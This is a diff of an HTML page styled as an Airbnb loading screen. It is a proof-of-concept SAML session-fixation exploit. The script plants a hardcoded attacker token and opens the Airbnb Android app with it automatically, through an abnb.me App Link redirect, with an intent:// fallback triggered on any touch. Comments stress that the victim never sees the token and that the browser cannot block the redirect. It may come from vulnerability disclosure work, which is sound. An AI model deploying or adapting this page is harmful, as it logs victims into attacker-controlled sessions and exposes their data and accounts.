@@ -7,7 +7,6 @@
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body { height: 100%; background: #FF5A5F; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", sans-serif; -webkit-tap-highlight-color: transparent; user-select: none; }
-    #tap-layer { position: fixed; inset: 0; z-index: 100; cursor: pointer; }
     .screen { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 32px; padding: 24px; }
     .logo { width: 72px; height: 72px; fill: #fff; }
     .wordmark { font-size: 32px; font-weight: 700; color: #fff; letter-spacing: -0.5px; }
@@ -16,13 +15,9 @@
     .loader span:nth-child(2) { animation-delay: 0.2s; }
     .loader span:nth-child(3) { animation-delay: 0.4s; }
     @keyframes pulse { 0%,100%{opacity:.3;transform:scale(.85)} 50%{opacity:1;transform:scale(1.1)} }
-    .hint { position: fixed; bottom: 40px; left: 0; right: 0; text-align: center; font-size: 13px; color: rgba(255,255,255,0.5); opacity: 0; transition: opacity 0.4s; }
-    .hint.visible { opacity: 1; }
-    #deeplink { display: none; }
   </style>
 </head>
 <body>
-<div id="tap-layer"></div>
 <div class="screen">
   <svg class="logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
     <path d="M16 1C10.5 1 1 11.4 1 19.1c0 4.4 2.8 7.7 6.9 7.7 2.2 0 4.1-.9 5.8-2.6l.3-.3.3.3c1.7 1.7 3.6 2.6 5.8 2.6 4.1 0 6.9-3.3 6.9-7.7C27 11.4 21.5 1 16 1zm5.8 22.5c-1.6 0-3-.7-4.4-2.2L16 19.8l-1.4 1.5c-1.4 1.5-2.8 2.2-4.4 2.2-2.9 0-4.7-2.3-4.7-5.4 0-6.6 8.4-16 10.5-16s10.5 9.4 10.5 16c0 3.1-1.8 5.4-4.7 5.4z"/>
@@ -30,34 +25,36 @@
   <div class="wordmark">airbnb</div>
   <div class="loader"><span></span><span></span><span></span></div>
 </div>
-<p class="hint" id="hint">Tap anywhere to open</p>
-<a id="deeplink" href=""></a>
 <script>
+  // Attacker's hardcoded SAML token — victim never sees or interacts with this
   var TOKEN = "6bihac4mstjga4k5ba2bncqif_A4W_SAML_FIXATION_PROOF";
-  var INTENT =
+
+  // abnb.me is Airbnb's official App Link domain — Android opens the app directly
+  // This is also exactly what a real attacker would send as a "normal" link
+  var APP_LINK = "https://abnb.me/saml-login?saml_token=" + encodeURIComponent(TOKEN);
+
+  // Custom scheme fallback
+  var SCHEME   = "airbnb://saml-login?saml_token=" + encodeURIComponent(TOKEN);
+
+  // intent:// for Chrome (fires from touchstart to satisfy gesture requirement)
+  var INTENT   =
     "intent://saml-login?saml_token=" + encodeURIComponent(TOKEN) +
     "#Intent;scheme=airbnb;package=com.airbnb.android;" +
     "S.browser_fallback_url=" + encodeURIComponent("https://www.airbnb.com") +
     ";end";
-  var link = document.getElementById("deeplink");
-  link.href = INTENT;
-  var fired = false;
-  function fire(e) {
-    if (fired) return;
-    fired = true;
-    if (e && e.preventDefault) e.preventDefault();
-    link.click();
-  }
-  // Attempt 1: auto-fire via anchor.click() — works on some Chrome/WebView versions
-  setTimeout(function() { if (!fired) fire(null); }, 400);
-  // Attempt 2: fire on first real touch — Chrome always allows intent:// from touchstart
-  var layer = document.getElementById("tap-layer");
-  layer.addEventListener("touchstart", fire, { once: true, passive: false });
-  layer.addEventListener("click", fire, { once: true });
-  // Show tap hint if auto-fire didn't land
+
+  // ── Method 1: redirect to abnb.me App Link (no gesture needed, no intent://) ──
+  // Android intercepts HTTPS navigations to abnb.me and opens Airbnb directly.
+  // Chrome cannot block this — it's a normal HTTPS redirect.
   setTimeout(function() {
-    if (!fired) document.getElementById("hint").classList.add("visible");
-  }, 1200);
+    window.location.href = APP_LINK;
+  }, 300);
+
+  // ── Method 2: on real touch, fire intent:// which Chrome always allows ────────
+  document.addEventListener("touchstart", function(e) {
+    e.preventDefault();
+    window.location.href = INTENT;
+  }, { once: true, passive: false });
 </script>
 </body>
 </html>
